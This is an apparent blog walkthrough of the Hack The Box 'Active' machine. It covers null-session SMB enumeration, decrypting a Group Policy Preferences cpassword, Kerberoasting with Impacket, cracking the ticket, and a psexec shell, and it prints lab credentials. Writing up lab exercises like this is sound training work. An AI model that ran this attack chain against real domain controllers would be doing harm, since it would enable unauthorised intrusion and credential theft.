---
title: "HTB Active"
categories:
  - CTF
tags:
  - Post OSCP
  - Active Directory
  - HTB
---

Active HTB walkthrough


| ----------- | ----------- |
| OS | Windows |
| Difficulty | Easy |
| Points | 20 | 
| Release | 28 Jul 2018|
| IP | 10.10.10.100 | 

Active is a easy windows box that nicely showcases some common windows active directory misconfigurations and attack vectors such as old GPP passwords and kerberoasting.

## Enumeration
As usual, we start by enumerating active services on the box using nmap

```
nmap -p- -sC -sV 10.10.10.100
```

``` 
-p- all ports
-sC run default scripts
-sV enumerate service versions
```

![Nmap]({{site.url}}/assets/CTF/HTB-Active/nmap.png)

Based on the enumerated ports, in particular 88 (Kerberos) and 389 (ldap) , this instantly looks like a domain controller and therefore gives some insight into what attack vectors may be present.

Based upon the open ports, the most obvious ‘quick win’ service is SMB (445).

### SMB
```
smbclient -L 10.10.10.100 -N
```
```
-L  list
-N  no password
```
![SMBClient]({{site.url}}/assets/CTF/HTB-Active/SMBClient.png)

From this we can see that the SMB configuration on this box does allow for null authentication, along with the fact that some shares are present.
From this position we could manually attempt to access each share to identify which ones we have read/write access to; or we can use SMBMap.
```
SMBMAP -H 10.10.10.100
```
```
-H Host
```
![SMBMap]({{site.url}}/assets/CTF/HTB-Active/SMBMap.png)

From this we can see the only share we have access to is ‘Replication’.

## Path to User

Using SMBGet we can pull all files from the Replication Share.
```
smbget -rR smb://10.10.10.100/Replication -a
```
```
       -a, --guest
           Work as user guest
       -r, --resume
           Automatically resume aborted files

       -R, --recursive
           Recursively download files
```
![SMBGet]({{site.url}}/assets/CTF/HTB-Active/SMBGet.png)

Instantly the file that jumps out is ‘Preferences/Groups/Groups.xml’ as this appears to be a group policy preference (GPP) file.

![GPPFile]({{site.url}}/assets/CTF/HTB-Active/GPPFile.png)

Prior to a patch being issued in 2014, Whenever a new Group Policy Preference (GPP) is created, an xml file created in the SYSVOL share with the relevent config data, including any passwords associated with the GPP. For security, Microsoft AES encrypts the password before it’s stored as cpassword. But then, in their infinite wisdom, Microsoft published the key on MSDN!
While the 2014 patch prevents passwords being entered into GPP, this does not remediate any legacy files that were already created, meaning that even today this attack vector is still found in organisation environments.


In order to decrypt the password, we just need to provide the cname string to the inbuild kali too gpp-decrypt.


![GPPdecrypt]({{site.url}}/assets/CTF/HTB-Active/GPPdecrypt.png)


And we now have a set of user credentials to play with:
```active.htb\SVC_TGS: GPPstillStandingStrong2k18```

Using these and SMBMap we can see if these provide us any more access via SMB.



![SMBMap2]({{site.url}}/assets/CTF/HTB-Active/SMBMap2.png)


A quick bit of enumeration only identifies the user.txt file as being accessible/relevant in this directory and no clues on how to escalate.


![UserFlag]({{site.url}}/assets/CTF/HTB-Active/userflag.png)


## Path to Root

As this box is a Domain Controller running the Kerberos service (88), we can use our newly obtained credentials to attempt to obtain hashed credentials via ‘Kerberoasting’. I highly recommend you do your own research into what Kerberoasting is but essentially:

*Kerberoasting is an attack path where any valid domain account requests a Kerberos service ticket for any service, the resulting ticket is then taken offline in an attempt to crack the associated NT hash of the user account used to encrypt the ticket.*

There are multiple different methods to initiate a kerberoasting attack, however my personal preference is Impacket’s GetUserSPNs.py


```
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
```
```
positional arguments:
  target              domain/username[:password]

-request              Requests TGS for users and output them in JtR/hashcat
                        format (default False)

-dc-ip 		  IP Address of the domain controller.
```

![Kerberos]({{site.url}}/assets/CTF/HTB-Active/kerberos.png)


We can now use john or hashcat to attempt to crack the obtained ticket has for the Administrator user.


![john]({{site.url}}/assets/CTF/HTB-Active/john.png)


Now we have the administrator’s password we could just navigate to the relevant user share to grab the root.txt flag. However I prefer to actually obtain a shell using psexec.py.

```
psexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
```
![rootflag]({{site.url}}/assets/CTF/HTB-Active/rootflag.png)

